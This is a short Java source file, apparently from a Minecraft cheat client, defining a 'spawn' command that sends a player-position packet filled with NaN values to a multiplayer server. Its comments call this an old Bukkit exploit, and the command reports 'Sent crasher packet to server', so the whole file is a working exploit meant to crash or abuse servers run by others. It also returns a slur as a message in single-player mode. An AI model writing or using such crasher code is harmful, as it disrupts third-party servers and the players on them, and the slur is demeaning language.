package lol.nebula.command.impl;

import lol.nebula.command.Command;
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition;

/**
 * @author aesthetical
 * @since 04/28/23
 */
public class SpawnTP extends Command {
    public SpawnTP() {
        super(new String[]{"spawn", "tpspawn", "spawntp", "stp"}, "Warps to spawn on alfheim.pw");
    }

    @Override
    public String dispatch(String[] args) {

        // lol
        if (mc.isSingleplayer()) return "retard";

        // funny old bukkit exploit
        mc.thePlayer.sendQueue.addToSendQueueNoEvent(new C04PacketPlayerPosition(
                Double.NaN, Double.NaN, Double.NaN, Double.NaN, false));

        return "Sent crasher packet to server";
    }
}
